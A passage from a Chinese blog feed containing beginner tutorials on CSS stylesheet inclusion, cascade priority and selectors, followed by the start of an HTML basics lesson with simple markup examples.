属性规定当前文档与被链接文档之间的关系。<br><strong><code>type=&quot;text/css&quot;</code></strong>是指文件的类型是样式表文本。<br><strong><code>media</code></strong>是选择媒体类型，这些媒体包括：屏幕，纸张，语音合成设备，盲文阅读设备等。</p></blockquote><p>　　<font color="#FF7F00"><strong>一个外部样式表文件可以应用于多个页面</strong></font>。当你改变这个样式表文件时，所有页面的样式都随之而改变。在制作大量相同样式页面的网站时，非常有用，不仅减少了重复的工作量，而且有利于以后的修改、编辑，浏览时也减少了重复下载代码。</p><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font><br>样式表文件可以用任何文本编辑器（例如：记事本）打开并编辑，一般样式表文件扩展名为.css。内容是定义的样式表，不包含HTML标记，mystyle.css这个文件的内容如下：</p></blockquote><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">hr </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> sienna<span class="token punctuation">}</span> <span class="token selector">p </span><span class="token punctuation">{</span><span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">}</span> <span class="token selector">body </span><span class="token punctuation">{</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url">url("images/back40.gif")</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">/*定义水平线的颜色为土黄；段落左边的空白边距为20象素；页面的背景图片为images目录下的back40.gif文件*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h5 id="2-内部样式表"><font color="#00B2EE" face="Microsoft YaHei">2. 内部样式表</font><a href="post/HTML-CSS#2-内部样式表"></a></h5><p><strong>内部样式表：</strong>是把样式表放到页面的<strong><code>&lt;head&gt;...&lt;/head&gt;</code></strong>区里，这些定义的样式就应用到页面中了，样式表是用<strong><code>&lt;style&gt;&lt;/style&gt;</code></strong>标记插入的。</p><p>从下例中可以看出&lt;style&gt;&lt;/style&gt;标记的用法：</p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">&lt;head> …… &lt;style type="text/css"> hr </span><span class="token punctuation">{</span><span class="token property">color</span><span class="token punctuation">:</span> sienna<span class="token punctuation">}</span> <span class="token selector">p </span><span class="token punctuation">{</span><span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">}</span> <span class="token selector">body </span><span class="token punctuation">{</span><span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url">url("images/back40.gif")</span><span class="token punctuation">}</span> &lt;/style> …… &lt;/head><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h5 id="3-导入外部样式表"><font color="#00B2EE" face="Microsoft YaHei">3. 导入外部样式表 </font><a href="post/HTML-CSS#3-导入外部样式表"></a></h5><p><strong>导入外部样式表：</strong>是指<font color="#FF7F00"><strong>在内部样式表的<code>&lt;style&gt;&lt;/style&gt;</code>里导入一个外部样式表</strong></font>，导入时用<strong><code>@import</code></strong>。</p><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> …… <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> @import <span class="token string">"mystyle.css"</span> 其他样式表的声明 <span class="token operator">--</span><span class="token operator">></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span> …… <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>例中<strong><code>@import &quot;mystyle.css&quot;</code></strong>表示导入mystyle.css样式表，注意使用时外部样式表的路径。方法和链入样式表的方法很相似，但导入外部样式表输入方式更有优势。实质上<font color="#FF7F00"><strong>它相当于存在内部样式表中的</strong></font>。 </p><p><font color="#FF7F00"><strong>注意：</strong></font>导入外部样式表必须在样式表的开始部分，在其他内部样式表上面。</p><p><font color="#FF7F00"></font></p><br><h5 id="4-内联样式"><font color="#00B2EE" face="Microsoft YaHei">4. 内联样式</font><a href="post/HTML-CSS#4-内联样式"></a></h5><p><strong>内联样式：</strong>是混合在HTML标记里使用的，用这种方法，可以很简单的对某个元素单独定义样式。内联样式的使用是<font color="#FF7F00"><strong>直接将在HTML标记里加入style参数</strong></font>。而style参数的内容就是CSS的属性和值</p><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> sienna<span class="token punctuation">;</span><span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> 这是一个段落 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--这个段落颜色为土黄，左边距为20象素--></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>在style参数后面的引号里的内容相当于在样式表大括号里的内容。 </p><p><font color="#FF7F00"><strong>注意：</strong></font><strong>style参数可以应用于任意BODY内的元素（包括BODY本身）</strong>，除了BASEFONT、PARAM和SCRIPT。</p><p><font color="#FF7F00"></font></p><br><h5 id="5-多重样式表叠加的优先级"><font color="#00B2EE" face="Microsoft YaHei">5. 多重样式表叠加的优先级</font><a href="post/HTML-CSS#5-多重样式表叠加的优先级"></a></h5><p>CSS样式表有层叠顺序，这里我们讨论插入样式表的这几种方法的叠加，如果在同一个选择器上使用几个不同的样式表时，这个属性值将会叠加几个样式表，<font color="#FF7F00"><strong>遇到冲突的地方会以最后定义的为准</strong></font>。例如，我们首先<strong>链入</strong><code>&lt;link&gt;</code><strong>一个外部样式表</strong>，其中定义了<strong><code>h3</code></strong>选择符的<strong><code>color</code></strong>、<strong><code>text-alig</code></strong>和<strong><code>font-size</code></strong>属性：</p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">h3 </span><span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span> <span class="token property">text-align</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">8</span>pt<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">/*标题3的文字颜色为红色；向左对齐；文字尺寸为8号字*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后在<strong>内部样式表</strong>里也定义了h3选择符的text-align和font-size属性：</p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">h3 </span><span class="token punctuation">{</span> <span class="token property">text-align</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">20</span>pt<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">/*标题3文字向右对齐；尺寸为20号字*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么这个页面叠加后的样式就是：</p><pre class="line-numbers language-css"><code class="language-css"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span> <span class="token property">text-align</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span> <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">20</span>pt<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*文字颜色为红色；向右对齐；尺寸为20号字*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>字体颜色从外部样式表里保留下来，而对齐方式和字体尺寸都有定义时，按照后定义的优先而依照内部样式表。</p><br><p><font face="Microsoft YaHei"><strong>w3school给出的优先级顺序从低到高是：</strong></font><br>浏览器缺省设置<br>外部样式表<br>内部样式表（位于 &lt;head&gt; 标签内部）<br>内联样式（在 HTML 元素内部）</p><p>因此，内联样式（在 HTML 元素内部）拥有最高的优先权，这意味着它将优先于以下的样式声明： 标签中的样式声明，外部样式表中的样式声明，或者浏览器中的样式声明（缺省值）。<br>可参考：<font color="#00B2EE">《<a href="https://segmentfault.com/a/1190000005005091" target="_blank" rel="noopener">css的样式优先级</a>》</font> </p><br><h4 id="2-2-CSS-选择器"><font color="#3CB371" face="Comic sans MS">2.2 CSS 选择器</font><a href="post/HTML-CSS#2-2-CSS-选择器"></a></h4><p>在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。<br>属性选择器可以根据元素的属性及属性值来选择元素。</p><p><strong>三种基本的选择器类型：</strong>标签名选择器、类选择器、ID选择器</p><p><font color="#FF7F00"><strong>注意：</strong></font>在标签内写入style=” “的方式，应该是CSS的一种引入方式，而不是选择器，因为根本就没有用到选择器。 </p><p><font color="#FF7F00"></font></p><h5 id="1-基本选择器"><font color="#00B2EE" face="Microsoft YaHei">1. 基本选择器</font><a href="post/HTML-CSS#1-基本选择器"></a></h5><p><font face="Microsoft YaHei"><strong>（1）标签名选择器</strong></font></p><p>一个HTML文档中有许多标签，例如p标签，h1标签等。若要使文档中的所有p标签都使用同一个CSS样式，就应使用标签选择器。 </p><p><font color="#FF7F00"><strong>注意：</strong></font>CSS标签选择器，与HTML标签的名称一样，但不能加尖括号。</p><p>示例：</p><p><font color="#FF7F00"></font></p><pre class="line-numbers language-css"><code class="language-css"><span class="token selector">&lt;head>    &lt;style type="text/css">       h1</span><span class="token punctuation">{</span>         <span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span>         <span class="token punctuation">}</span>       <span class="token selector">p</span><span class="token punctuation">{</span>         <span class="token property">color</span><span class="token punctuation">:</span>blue<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    &lt;/style>&lt;/head><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font face="Microsoft YaHei"><strong>（2）类选择器</strong></font></p><ul><li><p>使用标签选择器可以为整个HTML文档中的同一个标签指定相同的CSS样式。但是在实际运用中，HTML文档中的同一个标签会被反复使用。若要为相同的标签赋予不同的CSS样式就应使用类选择器。 </p></li><li><p><font color="#FF7F00"><strong>描述：</strong></font>给一类HTML标签加样式。这里所指的“一类”是：每个HTML标签都有一个class属性，且class的值一样。class属性是公共属性，每个HTML标签都有。</p></li><li><p>类选择器的名称，必须以<strong><code>.</code></strong>开头，后限HTML标签的class属性的值。如：<strong><code>.box{ color:red; }</code></strong></p></li></ul><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>测试一下<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>                <span class="token punctuation">.</span><span class="token constant">NO1</span><span class="token punctuation">{</span>                      color<span class="token punctuation">:</span>red<span class="token punctuation">;</span>                      background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token shell-comment comment">#88ff66;</span>                    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//无;或,号</span>               <span class="token punctuation">.</span>test<span class="token punctuation">{</span>                       color<span class="token punctuation">:</span>red<span class="token punctuation">;</span>                       border<span class="token punctuation">:</span>1px blue solid<span class="token punctuation">;</span>                     <span class="token punctuation">}</span>           <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>NO1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>习近平心中的互联网<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>测试代码<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p>这种定义class 的方式是前端开发最常用的选择器，有几个突出的特点：可以给不同的标签设置同一个类，从而用一条CSS命令控制几个标签，减少大量代码，是页面修改简单，易维护，易改版；其次，后台工作人员机会不会用到有关class的相关设置，不需要跟后台人员之间进行交互；再者，可以通过js等动态改变标签的Classname，从而改变整个标签的样式，使前端动态效果实现起来更为容易。</p></blockquote><br><p><font face="Microsoft YaHei"><strong>（3）id选择器</strong></font></p><ul><li><p>ID选择器和类选择器相似，不同的是，ID选择器不能复用。在一个XHTML文档中，一个ID选择器只能把其CSS样式指定给一个标签。 </p></li><li><p><font color="#FF7F00"><strong>注：</strong></font>网页中HTML标签的id属性的值，必须是唯一的。id属性一般是给JS使用的，不是让你来加样式的。class属性只能给CSS用，不能给JS用的。</p></li><li><p>id选择器的名称，必须以<strong><code>#</code></strong>开头，后跟HTML标记的id属性的值。</p></li></ul><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>php<span class="token punctuation">.</span>cn<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token shell-comment comment">#NO1{</span>        color<span class="token punctuation">:</span>blue<span class="token punctuation">;</span>        background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token shell-comment comment">#88ff99;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span>haha<span class="token punctuation">{</span>         color<span class="token punctuation">:</span>red<span class="token punctuation">;</span>         background<span class="token operator">-</span>color<span class="token punctuation">:</span><span class="token shell-comment comment">#88ff66;</span>     <span class="token punctuation">}</span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>NO1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>习近平心中的互联网<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>haha<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>互联网是<span class="token number">20</span>世纪最伟大的发明。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font face="Microsoft YaHei"><strong>（4）选择器的优先级</strong></font></p><p>参考：<br><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/css-style-priority.html" target="_blank" rel="noopener">CSS 样式优先级</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/ombre/p/7418667.html" target="_blank" rel="noopener">CSS样式优先级问题</a>》</font> </p><blockquote><p><strong>选择器的优先级从高到低：</strong><br>ID 选择器， 如 <strong><code>#id{}</code></strong><br>类选择器， 如 <strong><code>.class{}</code></strong><br>属性选择器， 如 <strong><code>a[href=&quot;segmentfault.com&quot;]{}</code></strong><br>伪类选择器， 如 <strong><code>:hover{}</code></strong><br>伪元素选择器， 如 <strong><code>::before{}</code></strong><br>标签选择器， 如 <strong><code>span{}</code></strong><br>通配选择器， 如 <strong><code>*{}</code></strong></p></blockquote><br><h5 id="2-id、class选择器的区别"><font color="#00B2EE" face="Microsoft YaHei">2. id、class选择器的区别</font><a href="post/HTML-CSS#2-id、class选择器的区别"></a></h5><p>id和class属性是网页中两个通用的属性，它们协同工作使整个页面变得丰富多彩。当我们为一个元素定义样式时。可以使用id，也可以使用class。但是我们也应该注意这两者的区别。 </p><ol><li><p>在css样式表中书写时，id选择符前面应该加前缀符号‘#’，而class选择符前面应该加前缀符号‘.’。 </p></li><li><p>id属性一般在一个页面中只可以使用一次，而class可以被多次引用。 </p></li><li><p>id作为元素的标签，用于区分不同结构和内容，而class作为一个样式，它可以应用到任何结构和内容上。 </p></li><li><p>在布局思路上，一般坚持这样的原则：id是先确定页面的结构和内容，然后再为它定义样式：而class相反，它先定义好一类样式，然后再页面中根据需要把类样式应用到不同的元素和内容上面。 </p></li><li><p>目前浏览器都能允许在同一个页面内出现多个相同属性值的id，一般情况下也能正常显示，不过当使用javascript通过id来控制元素时就会出现错误。 </p></li><li><p>在实际应用时，class更多的被应用到文字版块以及页面修饰等方面，而id更多地被用来实现宏伟布局和设计包含块，或包含框的样式。 </p></li></ol><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>ID 有高优先级、唯一性的特点，特指「个体」。<br>相对于 ID，class 的优先级比较适中，特指「特定群体」。<br>Class 的使用需要参考面向对象的抽象概念，把共有的属性抽象出来。</li><li>ID是先找到结构/内容，再给它定义样式；<br>Class是先定义好一种样式，再套给多个结构/内容</li></ol></blockquote><br><h5 id="3-组合选择器"><font color="#00B2EE" face="Microsoft YaHei">3. 组合选择器</font><a href="post/HTML-CSS#3-组合选择器"></a></h5><p><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html" target="_blank" rel="noopener">CSS 组合选择器</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html" target="_blank" rel="noopener">CSS基础教程之组合选择器</a>》</font> </p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML-基础</title>
      <link href="/post/HTML-basics/"/>
      <url>/post/HTML-basics/</url>
      
        <content type="html"><![CDATA[<p>使用HTML标记实际上也就是使用标签和其属性 ( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">HTML 基础</font> </center><br><br><h3 id="一-HTML-初识"><font color="#FF6347" face="Comic sans MS">一. HTML 初识</font><a href="post/HTML-basics#一-HTML-初识"></a></h3><p>当您保存 HTML 文件时，既可以使用 .htm 也可以使用 .html 扩展名。两者没有区别，完全根据您的喜好。</p><br><p><strong>HTML标签编写规范</strong></p><p>HTML<font color="#FF7F00"><strong>标记不区分大小写</strong></font>。如：<code>&lt;font&gt;</code>、<code>&lt;Font&gt;</code>、<code>&lt;fOnt&gt;</code>。单特殊符号必须小写，如<code>&amp;nbsp</code>。</p><p>HTML标记属性可有可无。有的标记是没有属性的，如：<code>&lt;html&gt;</code>、<code>&lt;head&gt;</code>、<code>&lt;title&gt;</code>等</p><p>双边标记的内容在开始和结束标签之间，单边标记没有内容。</p><p>HTML标记可以相互嵌套，但一定注意是顺序嵌套，外层套内层，一层套一层。</p><br><p><font color="#00B2EE"><strong>HTML，Hypertext Markup Language ,超文本标注语言。</strong></font>HTML是一种规范，是一种标准，编写网页的一种标准。<br><font color="#00B2EE"></font></p><ul><li><strong>超文本：</strong>就是网页上不光有文本，还有图片、音乐、视频等。</li><li><strong>标注：</strong>是一种记号，是一种标志。如：红绿灯</li><li><strong>语言：</strong>这里的“语言”就是代码，跟所谓“程序语言”一点关系都没有。</li></ul><p><strong>HTML的主要目的：</strong><font color="#FF7F00"><strong>就是用来显示网页的不同效果、不同部分。如：<code>&lt;b&gt;文本&lt;/b&gt;</code></strong></font></p><br><br><h4 id="1-1-HTML文件结构"><font color="#3CB371" face="Comic sans MS">1.1 HTML文件结构</font><a href="post/HTML-basics#1-1-HTML文件结构"></a></h4><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>php<span class="token punctuation">.</span>cn<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>这里是存放网页内容的<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>HTML 页面整体构成</strong><br>用浏览器打开任意一个网页，右键选择查看网页源码，就可以看到网站的HTML代码，总结一下，整体结构如下图：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/08/5c823abe1bb83.png" alt=" 1.png" data-zoomable></p></div><p><font color="#00B2EE" face="Microsoft YaHei"><strong>一、HTML文件结构的说明：</strong></font></p><ul><li><p><strong><code>&lt;!DOCTYPE HTML&gt;</code>：</strong>html5标准网页声明，<font color="#FF7F00"><strong>必须放在 HTML 文档的第一行</strong></font>，位于<code>&lt;html&gt;</code>标签之前。声明有助于浏览器中正确显示网页。</p></li><li><p><strong><code>&lt;html&gt;&lt;/html&gt;</code>：</strong>告诉浏览器，其中的代码用什么格式(图片、视频)来编译。</p></li><li><p><strong><code>&lt;head&gt;&lt;/head&gt;</code>：</strong>头部中包含的标记是页面的标题、序言、说明等内容，它本身<font color="#FF7F00"><strong>不作为内容来显示</strong></font>，但影响网页显示的效果。</p><ol><li>下面<font color="#FF7F00"><strong>这些标签可用在 head 部分：<code>&lt;title&gt;</code>,<code>&lt;meta&gt;</code>,  <code>&lt;base&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code></strong></font>。</li><li>头部中最常用的标记符是标题标记符<code>&lt;title&gt;页面标题&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>标记符，其中标题标记符用于定义网页的标题，它的内容显示在网页窗口的标题栏中，网页标题可被浏览器用作书签和收藏清单。</li><li>设置文档标题和其它在网页中不显示的信息，比如direction方向、语言代码Language Code（实体定义!ENTITY % i18n）、指定字典中的元信息、等等。</li></ol></li><li><p><strong><code>&lt;body&gt;&lt;/body&gt;</code>：</strong>是网页主要内容的显示区域。网页中显示的实际内容均包含在这2个正文标记符之间。正文标记符又称为实体标记。网页中99%的内容都必须放在<code>&lt;body&gt;</code>。只有放在<code>&lt;body&gt;</code>中，最终浏览器翻译以后，才能看见结果。</p></li></ul><br><p><font color="#00B2EE" face="Microsoft YaHei"><strong>二、关于头部<code>&lt;head&gt;&lt;/head&gt;</code>中常用的两个标签<code>&lt;title&gt;&lt;/title&gt;</code>和<code>&lt;meta&gt;</code>：</strong></font></p><ol><li><p><strong><code>&lt;title&gt;纯文本&lt;/title&gt;</code></strong><font color="#FF7F00"><strong>中只能是纯文本，任何标记都会原封不动的显示。</strong></font></p></li><li><p><strong><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</code></strong>功能：告诉浏览器，如何翻译汉字。</p><ol><li><strong>http-equiv：</strong>模拟http协议的文件头原信息，主要目的是服务器向客户端返回时，用什么格式显示。</li><li><strong>Content-type：</strong>内容类型。</li><li><strong>Content：</strong>详细内容类型介绍。</li><li><strong>Text/html：</strong>网页是text格式，html是文本中的小格式。</li><li><strong>Charset：</strong>字符集，主要控制汉字如何显示。</li><li><strong>Utf-8：</strong>多国语言编码，什么国家的语言都可以正常显示。</li></ol></li></ol><br><br><h4 id="1-2-HTML文件组成"><font color="#3CB371" face="Comic sans MS">1.2 HTML文件组成</font><a href="post/HTML-basics#1-2-HTML文件组成"></a></h4><blockquote><p><font color="#FF7F00"><strong>HTML 是什么</strong></font></p><ol><li>HTML 是用来描述网页的一种语言。</li><li>HTML 不是一种编程语言，而是一种标记语言</li><li>标记语言是一套标记标签 (markup tag)</li><li>HTML 使用标记标签来描述网页</li><li>HTML 文档包含了HTML 标签及文本内容</li><li>HTML文档也叫做 web 页面</li></ol></blockquote><br><blockquote><p><font color="#FF7F00"><strong>HTML 标签</strong></font></p><ol><li>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</li><li>HTML 标签是由尖括号包围的关键词，比如 <code>&lt;html&gt;</code></li><li>HTML 标签通常是成对出现的，比如 <code>&lt;b&gt;</code> 和 <code>&lt;/b&gt;</code>。也有单边标签，只有开始标签，而没结束标签，单边标签一般是没有内容。如：<code>&lt;br&gt;</code></li><li>标签对中的第一个标签是开始标签，第二个标签是结束标签</li><li>开始和结束标签也被称为开放标签和闭合标签</li><li>标签语法格式：<ol><li><strong>双边标签：<code>&lt;标签 属性1 = “值1”  属性2 = “值2”&gt;内容&lt;/标签&gt;</code></strong></li><li><strong>单边标签：<code>&lt;标签 属性1 = “值1”  属性2 